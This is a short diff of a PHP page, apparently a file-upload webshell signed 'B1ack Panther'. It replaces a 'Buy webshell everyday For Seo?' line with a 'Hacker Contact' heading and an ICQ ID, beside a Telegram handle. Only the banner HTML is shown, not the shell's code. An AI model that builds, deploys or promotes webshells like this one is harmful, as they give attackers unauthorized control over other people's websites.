@@ -50,7 +50,8 @@ class maxUpload{
 ?>
        <div id="container">
             <center><b>B1ack Panther Here.. ;)</b></center><br/>
-<center><b> Buy webshell everyday For Seo?  </b></center><br/>			
+<center><b> Hacker Contact  </b></center><br/>
+<center><b> ICQ ID:@749134859   </b></center><br/>				
 <center><b> TELIGRAM ID :@blackpanther1337 </b></center><br/>
 <?php
 if ($msg != ''){
